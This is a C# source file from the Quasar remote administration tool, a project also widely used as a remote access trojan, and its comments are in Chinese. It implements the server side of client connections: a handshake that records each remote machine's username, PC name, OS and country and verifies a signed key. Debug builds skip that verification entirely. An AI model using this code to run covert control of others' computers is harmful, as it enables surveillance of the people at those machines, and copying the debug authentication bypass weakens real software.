﻿using Quasar.Common.Cryptography;
using Quasar.Common.Messages;
using System;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Quasar.Server.Networking
{
    public class QuasarServer : Server
    {
        /// <summary>
        /// 获取当前连接并识别到服务器的客户端。
        /// </summary>
        public Client[] ConnectedClients
        {
            get { return Clients.Where(c => c != null && c.Identified).ToArray(); }
        }

        /// <summary>
        /// 当客户端连接时发生。
        /// </summary>
        public event ClientConnectedEventHandler ClientConnected;

        /// <summary>
        /// 表示将处理连接客户端的方法。
        /// </summary>
        /// <param name="client">连接的客户端。</param>
        public delegate void ClientConnectedEventHandler(Client client);

        /// <summary>
        /// 触发一个事件，通知订阅者客户端已连接。
        /// </summary>
        /// <param name="client">连接的客户端。</param>
        private void OnClientConnected(Client client)
        {
            if (ProcessingDisconnect || !Listening) return;
            var handler = ClientConnected;
            handler?.Invoke(client);
        }

        /// <summary>
        /// 当客户端断开连接时发生。
        /// </summary>
        public event ClientDisconnectedEventHandler ClientDisconnected;

        /// <summary>
        /// 表示将处理断开连接客户端的方法。
        /// </summary>
        /// <param name="client">断开连接的客户端。</param>
        public delegate void ClientDisconnectedEventHandler(Client client);

        /// <summary>
        /// 触发一个事件，通知订阅者客户端已断开连接。
        /// </summary>
        /// <param name="client">断开连接的客户端。</param>
        private void OnClientDisconnected(Client client)
        {
            if (ProcessingDisconnect || !Listening) return;
            var handler = ClientDisconnected;
            handler?.Invoke(client);
        }

        /// <summary>
        /// 构造函数，初始化所需对象并订阅服务器事件。
        /// </summary>
        /// <param name="serverCertificate">服务器证书。</param>
        public QuasarServer(X509Certificate2 serverCertificate) : base(serverCertificate)
        {
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
        }

        /// <summary>
        /// 决定客户端是连接还是断开连接。
        /// </summary>
        /// <param name="server">客户端连接的服务器。</param>
        /// <param name="client">更改状态的客户端。</param>
        /// <param name="connected">如果客户端连接则为True，如果断开连接则为False。</param>
        private void OnClientState(Server server, Client client, bool connected)
        {
            if (!connected)
            {
                if (client.Identified)
                {
                    OnClientDisconnected(client);
                }
            }
        }

        /// <summary>
        /// 将从客户端接收到的消息转发到MessageHandler。
        /// </summary>
        /// <param name="server">客户端连接的服务器。</param>
        /// <param name="client">接收消息的客户端。</param>
        /// <param name="message">接收到的消息。</param>
        private void OnClientRead(Server server, Client client, IMessage message)
        {
            if (!client.Identified)
            {
                if (message.GetType() == typeof (ClientIdentification))
                {
                    client.Identified = IdentifyClient(client, (ClientIdentification) message);
                    if (client.Identified)
                    {
                        client.Send(new ClientIdentificationResult {Result = true}); // finish handshake
                        OnClientConnected(client);
                    }
                    else
                    {
                        // identification failed
                        client.Disconnect();
                    }
                }
                else
                {
                    // no messages of other types are allowed as long as client is in unidentified state
                    client.Disconnect();
                }
                return;
            }

            MessageHandler.Process(client, message);
        }

        private bool IdentifyClient(Client client, ClientIdentification packet)
        {
            if (packet.Id.Length != 64)
                return false;

            client.Value.Version = packet.Version;
            client.Value.OperatingSystem = packet.OperatingSystem;
            client.Value.AccountType = packet.AccountType;
            client.Value.Country = packet.Country;
            client.Value.CountryCode = packet.CountryCode;
            client.Value.Id = packet.Id;
            client.Value.Username = packet.Username;
            client.Value.PcName = packet.PcName;
            client.Value.Tag = packet.Tag;
            client.Value.ImageIndex = packet.ImageIndex;
            client.Value.EncryptionKey = packet.EncryptionKey;

            // TODO: Refactor tooltip
            //if (Settings.ShowToolTip)
            //    client.Send(new GetSystemInfo());

#if !DEBUG
            try
            {
                var csp = (RSACryptoServiceProvider)ServerCertificate.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(packet.EncryptionKey)),
                    CryptoConfig.MapNameToOID("SHA256"), packet.Signature);
            }
            catch (Exception)
            {
                return false;
            }
#else
            return true;
#endif
        }
    }
}
